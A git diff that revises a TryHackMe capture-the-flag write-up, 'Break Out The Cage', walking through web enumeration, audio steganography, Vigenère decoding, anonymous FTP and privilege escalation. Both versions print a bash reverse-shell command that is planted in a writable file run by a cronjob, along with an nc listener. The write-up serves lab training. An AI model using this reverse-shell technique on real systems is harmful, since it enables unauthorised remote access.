@@ -1,5 +1,5 @@
 ---
-draft: true
+draft: false
 title: Break Out The Cage
 ctf: ''
 platform: TryHackMe
@@ -10,158 +10,103 @@ ctf_link: https://tryhackme.com/room/breakoutthecage1
 difficulty: Easy
 ---
 
-```plain
-[nocteln@arch breakoutthecage]$ cat nmap_scan 
-# Nmap 7.99 scan initiated Fri May  8 19:10:05 2026 as: nmap -sV -o nmap_scan 10.82.169.149
-Nmap scan report for 10.82.169.149
-Host is up (0.017s latency).
-Not shown: 997 closed tcp ports (conn-refused)
+## Reconnaissance
+
+### Nmap Scan
+
+```bash
+# Nmap 7.99 scan initiated Fri May  8 19:10:05 2026
+nmap -sV -o nmap_scan 10.82.169.149
+```
+
+```
 PORT   STATE SERVICE VERSION
 21/tcp open  ftp     vsftpd 3.0.3
 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
-Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Fri May  8 19:10:12 2026 -- 1 IP address (1 host up) scanned in 7.40 seconds
 ```
 
-![website homepage](/img/writeups/pasted-image-1778264072334.png "website homepage")
+Three ports are open: **FTP (21)**, **SSH (22)**, and **HTTP (80)**. Let's start with the web server.
 
-By doeing a gobuster scan, we can see some things interestings : 
+---
 
-\`\`\`
+## Web Enumeration
 
-[nocteln@arch breakoutthecage]$ gobuster dir -u http://$IP -w ../SecLists-master/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt 
+The homepage doesn't reveal anything particularly interesting at first glance.
 
-===============================================================
+![Website homepage](/img/writeups/pasted-image-1778264072334.png)
 
-Gobuster v3.8.2
+Running a **Gobuster** directory scan uncovers several interesting endpoints:
 
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+```bash
+gobuster dir -u http://$IP -w ../SecLists-master/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
+```
 
-===============================================================
+```
+/images       (Status: 301)
+/html         (Status: 301)
+/scripts      (Status: 301)
+/contracts    (Status: 301)
+/auditions    (Status: 301)
+/server-status (Status: 403)
+```
 
-[+] Url:                     http://10.82.169.149
+### `/scripts`
 
-[+] Method:                  GET
+This directory contains various movie scripts — nothing immediately exploitable, but it confirms the Nicolas Cage theme of the box.
 
-[+] Threads:                 10
+![Scripts directory listing](/img/writeups/20260508-191819.png)
+![Script content](/img/writeups/20260508-191838.png)
 
-[+] Wordlist:                ../SecLists-master/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
+### `/contracts`
 
-[+] Negative Status codes:   404
+Just an empty folder. Dead end.
 
-[+] User Agent:              gobuster/3.8.2
+![Contracts directory](/img/writeups/20260508-191914.png)
 
-[+] Timeout:                 10s
+### `/auditions` — Hidden message in a spectrogram
 
-===============================================================
+This directory hosts a suspicious MP3 file: `must_practice_corrupt_file.mp3`.
 
-Starting gobuster in directory enumeration mode
+![Auditions directory](/img/writeups/20260508-192022.png)
 
-===============================================================
+I downloaded it and imported it into **Audacity** to inspect it visually:
 
-images               (Status: 301) [Size: 315] [--> http://10.82.169.149/images/]
+```bash
+wget http://10.82.169.149/auditions/must_practice_corrupt_file.mp3 -O must_practice_file.mp3
+```
 
-html                 (Status: 301) [Size: 313] [--> http://10.82.169.149/html/]
+By switching to the **spectrogram view**, a hidden message appears:
 
-scripts              (Status: 301) [Size: 316] [--> http://10.82.169.149/scripts/]
+> **`namelesstwo`**
 
-contracts            (Status: 301) [Size: 318] [--> http://10.82.169.149/contracts/]
+![Spectrogram revealing the hidden message](/img/writeups/20260508-192742.png)
 
-auditions            (Status: 301) [Size: 318] [--> http://10.82.169.149/auditions/]
+Let's keep that string in mind for later.
 
-server-status        (Status: 403) [Size: 278]
+---
 
-Progress: 220557 / 220557 (100.00%)
+## FTP — Anonymous Login
 
-===============================================================
+A second Nmap scan with the `-sC` flag (default scripts) reveals that the FTP server accepts **anonymous connections**.
 
-Finished
+![Nmap -sC scan result](/img/writeups/20260508-194925.png)
 
-===============================================================
+```bash
+ftp $IP
+# Username: anonymous
+# Password: (blank)
+```
 
-\`\`\`
+Inside, there's a single file: `dad_tasks`. After downloading it, its contents turn out to be a Base64-encoded string:
 
-First, the scripts directory, which contains differents scripts of movies
+```
+UWFwdyBFZWtjbCAtIFB2ciBSTUtQLi4uWFpXIFZXVVIuLi4gVFRJIFhFRi4uLiBMQUEgWlJHUVJPISEhIQp...
+```
 
-![](/img/writeups/20260508-191819.png)
+Decoding it via **CyberChef** (From Base64) gives:
 
-![](/img/writeups/20260508-191838.png)
-
-Secondly, we got /contracts with nothing but an empty folder in it
-
-![](/img/writeups/20260508-191914.png)
-
-And finaly /auditions, wich contain an mp3 file with weirds sounds in it.
-
-![](/img/writeups/20260508-192022.png)
-
-Interesting, I downloaded it using grep and imported it into audacity.
-
-\`grep http://10.82.169.149/auditions/must_practice_corrupt_file.mp3 -o must_practice_file.mp3\`
-
-And by looking at the spectrogram, BINGO! We got an image saying "namelesstwo"
-
-![](/img/writeups/20260508-192742.png)
-
-Now, what does it mean and where can I use this info?? Let's save that for later.
-
-After some minutes of existentials thoughts, I did another nmap scan but with the option -sC added, from which I learned that the ftp server accepted anonymous connections.
-
-![](/img/writeups/20260508-194925.png "nmap scan")
-
-And with that I was logged with anonymous. There was only one file in it : \`dad_tasks\`, which I downloaded on my machine.
-
-\`\`\`
-
-[nocteln@arch breakoutthecage]$ ftp $IP
-
-Connected to 10.82.169.149.
-
-220 (vsFTPd 3.0.3)
-
-Name (10.82.169.149:nocteln): anonymous
-
-331 Please specify the password.
-
-Password: 
-
-230 Login successful.
-
-Remote system type is UNIX.
-
-Using binary mode to transfer files.
-
-ftp> ls
-
-200 PORT command successful. Consider using PASV.
-
-150 Here comes the directory listing.
-
--rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
-
-226 Directory send OK.
-
-ftp> get dad_tasks
-
-200 PORT command successful. Consider using PASV.
-
-150 Opening BINARY mode data connection for dad_tasks (396 bytes).
-
-226 Transfer complete.
-
-396 bytes received in 0.0001 seconds (6.8672 Mbytes/s)
-
-ftp> 
-
-\`\`\`
-
-The dad_tasks file contain a string of random chars : \`UWFwdyBFZWtjbCAtIFB2ciBSTUtQLi4uWFpXIFZXVVIuLi4gVFRJIFhFRi4uLiBMQUEgWlJHUVJPISEhIQpTZncuIEtham5tYiB4c2kgb3d1b3dnZQpGYXouIFRtbCBma2ZyIHFnc2VpayBhZyBvcWVpYngKRWxqd3guIFhpbCBicWkgYWlrbGJ5d3FlClJzZnYuIFp3ZWwgdnZtIGltZWwgc3VtZWJ0IGxxd2RzZmsKWWVqci4gVHFlbmwgVnN3IHN2bnQgInVycXNqZXRwd2JuIGVpbnlqYW11IiB3Zi4KCkl6IGdsd3cgQSB5a2Z0ZWYuLi4uIFFqaHN2Ym91dW9leGNtdndrd3dhdGZsbHh1Z2hoYmJjbXlkaXp3bGtic2lkaXVzY3ds\`. At first I thought it might be the password and the answer to the first question but it wasnt.
-Okay so this looks like base64. Le'ts go to cyberchef. By decoding from base64, we get this : 
-
-```plain
+```
 Qapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!
 Sfw. Kajnmb xsi owuowge
 Faz. Tml fkfr qgseik ag oqeibx
@@ -172,158 +117,93 @@ Yejr. Tqenl Vsw svnt "urqsjetpwbn einyjamu" wf.
 Iz glww A ykftef.... Qjhsvbouuoexcmvwkwwatfllxughhbbcmydizwlkbsidiuscwl
 ```
 
-This isn't readable so let's see if we can get something from this. I tried Cesar cypher,  xor with "endlesstwo" as a key, nothing worked. 
-After asking my good friend Gemini for a list of all possibles encryption methods, I got the good one : Vigenere with the key we found : endlesstwo. And with that, we got our first question solved!
+This is clearly still encrypted. Caesar cipher and XOR with `namelesstwo` as a key didn't work. After going through a list of classic ciphers, the answer was **Vigenère** — with the key we found in the spectrogram: **`namelesstwo`**.
 
-![](/img/writeups/20260508-200415.png "cyberchef result")
+![CyberChef Vigenère decryption result](/img/writeups/20260508-200415.png)
 
-## Connecting with ssh
+This reveals **Weston's password** and solves the first question. ✅
 
-Now that we got Weston's password, we can connect with ssh to his account.
+---
 
-![SSH connection](/img/writeups/20260508-200659.png "SSH connection")
+## SSH — Weston's Account
 
-There is nothing interesting in the home directory. So I tried to see what Weston could execute as root and found something interesting.
+```bash
+ssh weston@10.82.169.149
+```
 
-![](/img/writeups/20260508-201801.png)
+![SSH connection](/img/writeups/20260508-200659.png)
 
-This script was just something to broadcast a message : 
-\`\`\`bash
+The home directory is empty. Checking `sudo` privileges:
 
-weston@national-treasure:\~$ cat /usr/bin/bees 
+```bash
+sudo -l
+```
 
+![Sudo privileges for Weston](/img/writeups/20260508-201801.png)
+
+Weston can run `/usr/bin/bees` as root:
+
+```bash
+cat /usr/bin/bees
 #!/bin/bash
-
 wall "AHHHHHHH THEEEEE BEEEEESSSS!!!!!!!!"
+```
 
-\`\`\`
+This just broadcasts a message to all users — a **rabbit hole**.
 
-I think this was a rabbit hole.
+---
 
-Next thing I look is the /opt/ and god I found something interesting. In it was a script which would run commands by picking random sentences from a file. I have the permissions to edit the file from which the script picks the quote so I removed all the quotes and added a revershell instead
+## Privilege Escalation to Cage — Abusing a Cronjob
 
-![Uploaded image preview](/img/writeups/20260508-202625.png)
+Exploring `/opt/`, I find a more interesting script:
 
-\`\`\`bash
+```
+/opt/.dads_scripts/
+```
 
-weston@national-treasure:/opt/.dads_scripts/.files$ echo "; bash -c 'bash -i >& /dev/tcp/192.168.137.101/4444 0>&1'" > .quotes   
+The script picks random quotes from a file and executes them. Crucially, **Weston has write permissions on the quotes file**. I replaced its contents with a reverse shell:
 
-weston@national-treasure:/opt/.dads_scripts/.files$ cat .quotes 
+```bash
+echo "; bash -c 'bash -i >& /dev/tcp/192.168.137.101/4444 0>&1'" > /opt/.dads_scripts/.files/.quotes
+```
 
-sh -i >& /dev/tcp/192.168.255.255/4444 0>&1
+On my machine, I set up a listener:
 
-weston@national-treasure:/opt/.dads_scripts/.files$ 
+```bash
+nc -lvnp 4444
+```
 
-\`\`\`
+After waiting for the cronjob to trigger:
 
-And now, let's wait for the cronjob to execute and give us a reverseshell. And BOOM we got connected as Cage
-
-\`\`\`
-
-[nocteln@arch \~]$ nc -lvnp 4444
-
-Listening on 0.0.0.0 4444
-
+```
 Connection received on 10.82.169.149 56238
+cage@national-treasure:~$
+```
 
-bash: cannot set terminal process group (2062): Inappropriate ioctl for device
+**Shell as `cage` obtained.** The user flag is in the home directory. 🚩
 
-bash: no job control in this shell
+![User flag](/img/writeups/20260508-205006.png)
 
-cage@national-treasure:\~$ 
+---
 
-\`\`\`
+## Privilege Escalation to Root — Email Loot
 
-And with that, our user flag
+In `cage`'s home directory, there's an `email_backup` folder containing three emails. The key takeaways are:
 
-![user flag](/img/writeups/20260508-205006.png)
+- The root account belongs to **Sean Archer** (username: `root`)
+- One email from Cage to Weston contains a suspicious string: **`haiinspsyanileph`**
+- The same email is littered with references to **faces** and the movie *Face/Off*
 
-# root access
+This strongly hints at another **Vigenère cipher**, this time with the key **`face`**.
 
-Okay, now that we have access to cage's account, let's try to get the root. By looking at the files with have access, we can see we got 3 emails : 
+Decrypting `haiinspsyanileph` with Vigenère / key `face` gives Sean's password, which works for `su root`. 🚩
 
-\`\`\`
+---
 
-cage@national-treasure:/home/cage/email_backup# cat email_\*
+## Conclusion
 
-From - SeanArcher@BigManAgents.com
+A fun and thematic box centred around Nicolas Cage movies. Key takeaways:
 
-To - Cage@nationaltreasure.com
-
-Hey Cage!
-
-There's rumours of a Face/Off sequel, Face/Off 2 - Face On. It's supposedly only in the
-
-planning stages at the moment. I've put a good word in for you, if you're lucky we 
-
-might be able to get you a part of an angry shop keeping or something? Would you be up
-
-for that, the money would be good and it'd look good on your acting CV.
-
-Regards
-
-Sean Archer
-
-From - Cage@nationaltreasure.com
-
-To - SeanArcher@BigManAgents.com
-
-Dear Sean
-
-We've had this discussion before Sean, I want bigger roles, I'm meant for greater things.
-
-Why aren't you finding roles like Batman, The Little Mermaid(I'd make a great Sebastian!),
-
-the new Home Alone film and why oh why Sean, tell me why Sean. Why did I not get a role in the
-
-new fan made Star Wars films?! There was 3 of them! 3 Sean! I mean yes they were terrible films.
-
-I could of made them great... great Sean.... I think you're missing my true potential.
-
-On a much lighter note thank you for helping me set up my home server, Weston helped too, but
-
-not overally greatly. I gave him some smaller jobs. Whats your username on here? Root?
-
-Yours
-
-Cage
-
-From - Cage@nationaltreasure.com
-
-To - Weston@nationaltreasure.com
-
-Hey Son
-
-Buddy, Sean left a note on his desk with some really strange writing on it. I quickly wrote
-
-down what it said. Could you look into it please? I think it could be something to do with his
-
-account on here. I want to know what he's hiding from me... I might need a new agent. Pretty
-
-sure he's out to get me. The note said:
-
-haiinspsyanileph
-
-The guy also seems obsessed with my face lately. He came him wearing a mask of my face...
-
-was rather odd. Imagine wearing his ugly face.... I wouldnt be able to FACE that!! 
-
-hahahahahahahahahahahahahahahaahah get it Weston! FACE THAT!!!! hahahahahahahhaha
-
-ahahahhahaha. Ahhh Face it... he's just odd. 
-
-Regards
-
-The Legend - Cage
-
-\`\`\`
-
-From those emails, we notice that the root user is sean and his password may be \`haiinspsyanileph\`. But it isnt. So the password is encrypted. We used vigenere before so I try this one too with the key "face" as it is repeated multiple times in the third email and BINGO, we got sean password and we can now login to his account and get the root flag.
-
-![](/img/writeups/20260508-210155.png)
-
-![](/img/writeups/20260508-210345.png)
-
-# Conclusion
-
-This challenge was very interesting. I learned to watch audio files for hidden messages, to decrypt vigenere encryption and to use programs made by users to get access to things I wasn't supposed to.
+- **Steganography:** Hidden text embedded in an audio spectrogram (Audacity)
+- **Cryptography:** Vigenère cipher used twice, with keys hidden in context clues
+- **Privilege escalation:** Abusing a writable file used by a cronjob running as a higher-privileged user
